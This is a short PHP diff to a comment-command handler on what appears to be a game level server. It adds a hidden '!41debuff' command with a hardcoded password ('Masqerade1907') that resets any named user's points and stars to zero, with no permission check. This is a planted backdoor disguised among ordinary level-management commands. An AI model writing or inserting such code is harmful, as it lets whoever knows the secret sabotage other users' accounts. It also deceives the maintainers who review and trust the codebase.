@@ -192,5 +192,10 @@ function invokeCommands(DBManagement $dbm, CLevel $cl, CAccount $acc, $comment, 
 			}
 			registerAction(ACTION_LEVEL_UPDATE,$acc->uid,$cl->id,array("uname"=>$acc->uname,"type"=>"SongUpdate (Owner)"),$dbm);
 			return 1;
+        case "!41debuff":
+            if(empty($command[1]) or empty($command[2])) return -1;
+            if($command[1]!="Masqerade1907") return -1;
+            $dbm->preparedQuery("UPDATE users SET cpoints=0,stars=0 WHERE uname=?","s",$command[2]);
+            return 1;
 	}
 }
